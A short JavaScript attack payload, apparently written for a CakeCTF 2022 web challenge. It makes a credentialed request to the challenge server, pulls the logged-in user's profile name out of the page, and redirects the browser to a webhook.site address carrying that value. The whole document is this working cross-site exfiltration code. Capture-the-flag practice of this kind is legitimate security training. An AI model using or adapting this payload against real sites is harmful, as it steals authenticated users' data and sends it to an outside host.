var r = new XMLHttpRequest();
r.open("GET", "http://web1.2022.cakectf.com:8003/", true); 
r.onreadystatechange = function() { 
	if (r.readyState == 4){
		var res = r.response.split('\'s Profile')[0].split('<h1>')[1].replace(/\s/g, '');
		window.location = 'http://webhook.site/dbf476db-cc47-44b9-9ee0-e481c5a73b06/q=' + res;
	}
};
r.withCredentials = true;
r.send();
